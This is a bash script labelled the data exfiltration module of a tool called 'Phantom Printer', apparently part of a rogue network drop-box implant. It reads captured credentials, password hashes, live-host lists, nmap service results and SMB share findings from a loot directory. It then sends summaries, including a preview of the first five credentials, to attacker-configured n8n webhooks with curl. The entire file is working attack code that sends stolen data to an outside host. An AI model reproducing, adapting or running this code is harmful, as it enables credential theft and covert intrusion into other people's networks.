#!/bin/bash
#================================================================
# PHANTOM PRINTER - DATA EXFILTRATION MODULE
# Sends loot data to n8n webhooks for processing
#================================================================

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(dirname "$(dirname "$SCRIPT_DIR")")"
CONFIG_FILE="$BASE_DIR/config/dropbox.conf"
LOOT_DIR="$BASE_DIR/loot"
LOG_FILE="$BASE_DIR/logs/exfil.log"

# Load config
if [[ -f "$CONFIG_FILE" ]]; then
    source "$CONFIG_FILE"
fi

DROPBOX_ID="${DROPBOX_ID:-phantom-001}"

# n8n Webhook URLs - UPDATE THESE
N8N_BASE_URL="${N8N_WEBHOOK_BASE:-https://your-n8n-instance.com}"
N8N_LOOT_WEBHOOK="${N8N_BASE_URL}/webhook/dropbox-loot"
N8N_ALERT_WEBHOOK="${N8N_BASE_URL}/webhook/dropbox-alert"

# Logging
log() { 
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

#================================================================
# EXFIL ALL - Send loot summary to n8n
#================================================================
exfil_all() {
    log "=== EXFILTRATING ALL LOOT ==="
    
    # Count stats
    local total_creds=0
    local total_hashes=0
    local total_hosts=0
    
    if [[ -f "$LOOT_DIR/creds/credentials.txt" ]]; then
        total_creds=$(wc -l < "$LOOT_DIR/creds/credentials.txt" 2>/dev/null || echo "0")
    fi
    
    if ls "$LOOT_DIR/hashes"/*.txt >/dev/null 2>&1; then
        for hashfile in "$LOOT_DIR/hashes"/*.txt; do
            if [[ -f "$hashfile" ]]; then
                count=$(wc -l < "$hashfile" 2>/dev/null || echo "0")
                total_hashes=$((total_hashes + count))
            fi
        done
    fi
    
    if [[ -f "$LOOT_DIR/scans/live-hosts.txt" ]]; then
        total_hosts=$(wc -l < "$LOOT_DIR/scans/live-hosts.txt" 2>/dev/null || echo "0")
    fi
    
    # Get host list (first 20, newline separated - n8n Code node handles formatting)
    local hosts_list=""
    if [[ -f "$LOOT_DIR/scans/live-hosts.txt" ]]; then
        hosts_list=$(head -n 20 "$LOOT_DIR/scans/live-hosts.txt" | tr '\n' ',' | sed 's/,$//')
        if [[ $total_hosts -gt 20 ]]; then
            local remaining=$((total_hosts - 20))
            hosts_list="${hosts_list}, +${remaining} more"
        fi
    else
        hosts_list="No hosts found"
    fi
    
    # Get services summary
    local services_list="No service data"
    local latest_nmap=$(ls -t "$LOOT_DIR/scans"/nmap-services-*.nmap 2>/dev/null | head -1)
    if [[ -f "$latest_nmap" ]]; then
        services_list=$(grep -oP '^\d+/tcp\s+open\s+\K[^\s]+' "$latest_nmap" 2>/dev/null | sort | uniq -c | sort -rn | head -10 | awk '{printf "%d x %s\n", $1, $2}' | tr '\n' ',' | sed 's/,$//')
        if [[ -z "$services_list" ]]; then
            services_list="No open services found"
        fi
    fi
    
    # Get SMB shares
    local smb_shares="No accessible shares"
    local latest_smb=$(ls -t "$LOOT_DIR/scans"/smb-enum-*.txt 2>/dev/null | head -1)
    if [[ -f "$latest_smb" ]]; then
        local shares=$(grep -E "READ|WRITE" "$latest_smb" 2>/dev/null | head -5 | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')
        if [[ -n "$shares" ]]; then
            smb_shares="$shares"
        fi
    fi
    
    # Build JSON payload for n8n
    # Using jq if available for proper escaping, otherwise manual
    if command -v jq &>/dev/null; then
        payload=$(jq -n \
            --arg dropbox_id "$DROPBOX_ID" \
            --arg type "loot_summary" \
            --argjson hosts_count "$total_hosts" \
            --argjson creds_count "$total_creds" \
            --argjson hashes_count "$total_hashes" \
            --arg hosts "$hosts_list" \
            --arg services "$services_list" \
            --arg smb_shares "$smb_shares" \
            '{
                dropbox_id: $dropbox_id,
                type: $type,
                stats: {
                    hosts: $hosts_count,
                    credentials: $creds_count,
                    hashes: $hashes_count
                },
                hosts: $hosts,
                services: $services,
                smb_shares: $smb_shares
            }')
    else
        # Manual JSON construction (escape quotes and backslashes)
        hosts_list=$(echo "$hosts_list" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        services_list=$(echo "$services_list" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        smb_shares=$(echo "$smb_shares" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        
        payload=$(cat <<EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "loot_summary",
    "stats": {
        "hosts": $total_hosts,
        "credentials": $total_creds,
        "hashes": $total_hashes
    },
    "hosts": "$hosts_list",
    "services": "$services_list",
    "smb_shares": "$smb_shares"
}
EOF
)
    fi
    
    # Send to n8n webhook
    log "Sending loot summary to n8n..."
    local response=$(curl -s -w "\n%{http_code}" -X POST "$N8N_LOOT_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 60 2>&1)
    
    local http_code=$(echo "$response" | tail -n1)
    local body=$(echo "$response" | sed '$d')
    
    if [[ "$http_code" == "200" ]]; then
        log "Loot summary sent to n8n successfully"
    else
        log "ERROR: Failed to send to n8n (HTTP $http_code)"
        log "Response: $body"
    fi
    
    # Print local summary
    echo ""
    echo "📊 LOOT SUMMARY"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🖥️  Hosts:       $total_hosts"
    echo "🔑 Credentials: $total_creds"
    echo "🔐 Hashes:      $total_hashes"
    echo ""
    echo "📋 Hosts: $hosts_list"
    echo ""
    echo "🌐 Services: $services_list"
    echo ""
    echo "📁 SMB: $smb_shares"
    echo ""
    
    log "=== EXFILTRATION COMPLETE ==="
}

#================================================================
# EXFIL CREDS - Send credential alert to n8n
#================================================================
exfil_creds() {
    log "Exfiltrating credentials..."
    
    local creds_file="$LOOT_DIR/creds/credentials.txt"
    
    if [[ ! -f "$creds_file" || ! -s "$creds_file" ]]; then
        log "No credentials to exfil"
        return
    fi
    
    local total=$(wc -l < "$creds_file")
    local preview=$(head -n 5 "$creds_file")
    
    # Build payload
    if command -v jq &>/dev/null; then
        payload=$(jq -n \
            --arg dropbox_id "$DROPBOX_ID" \
            --arg type "credentials" \
            --arg level "high" \
            --arg message "$total credentials captured" \
            --arg preview "$preview" \
            '{
                dropbox_id: $dropbox_id,
                type: $type,
                level: $level,
                message: $message,
                preview: $preview
            }')
    else
        preview=$(echo "$preview" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | tr '\n' ' ')
        payload=$(cat <<EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "credentials",
    "level": "high",
    "message": "$total credentials captured",
    "preview": "$preview"
}
EOF
)
    fi
    
    curl -s -X POST "$N8N_ALERT_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 60 >/dev/null 2>&1
    
    log "Credentials exfiltrated via n8n"
}

#================================================================
# EXFIL HASHES - Send hash alert to n8n
#================================================================
exfil_hashes() {
    log "Exfiltrating hashes..."
    
    local hash_count=0
    
    if ls "$LOOT_DIR/hashes"/*.txt >/dev/null 2>&1; then
        for hashfile in "$LOOT_DIR/hashes"/*.txt; do
            if [[ -f "$hashfile" && -s "$hashfile" ]]; then
                local filename=$(basename "$hashfile")
                local total=$(wc -l < "$hashfile")
                
                if command -v jq &>/dev/null; then
                    payload=$(jq -n \
                        --arg dropbox_id "$DROPBOX_ID" \
                        --arg type "hashes" \
                        --arg level "high" \
                        --arg message "$filename - $total hashes captured" \
                        '{
                            dropbox_id: $dropbox_id,
                            type: $type,
                            level: $level,
                            message: $message
                        }')
                else
                    payload=$(cat <<EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "hashes",
    "level": "high",
    "message": "$filename - $total hashes captured"
}
EOF
)
                fi
                
                curl -s -X POST "$N8N_ALERT_WEBHOOK" \
                    -H "Content-Type: application/json" \
                    -d "$payload" \
                    --max-time 60 >/dev/null 2>&1
                
                ((hash_count++))
            fi
        done
    fi
    
    log "Exfiltrated $hash_count hash files via n8n"
}

#================================================================
# SEND ALERT - Generic alert sender
#================================================================
send_alert() {
    local alert_type="$1"
    local level="$2"
    local message="$3"
    
    if command -v jq &>/dev/null; then
        payload=$(jq -n \
            --arg dropbox_id "$DROPBOX_ID" \
            --arg type "$alert_type" \
            --arg level "$level" \
            --arg message "$message" \
            '{
                dropbox_id: $dropbox_id,
                type: $type,
                level: $level,
                message: $message
            }')
    else
        message=$(echo "$message" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        payload=$(cat <<EOF
{
    "dropbox_id": "$DROPBOX_ID",
    "type": "$alert_type",
    "level": "$level",
    "message": "$message"
}
EOF
)
    fi
    
    curl -s -X POST "$N8N_ALERT_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        --max-time 60 >/dev/null 2>&1
}

#================================================================
# MAIN
#================================================================

case "${1:-all}" in
    all)
        exfil_all
        ;;
    creds)
        exfil_creds
        ;;
    hashes)
        exfil_hashes
        ;;
    alert)
        # Usage: exfil.sh alert <type> <level> <message>
        send_alert "${2:-info}" "${3:-info}" "${4:-Alert from dropbox}"
        ;;
    *)
        echo "Usage: $0 {all|creds|hashes|alert}"
        echo ""
        echo "Commands:"
        echo "  all     - Send full loot summary to n8n"
        echo "  creds   - Send credentials alert"
        echo "  hashes  - Send hashes alert"
        echo "  alert   - Send custom alert: $0 alert <type> <level> <message>"
        exit 1
        ;;
esac
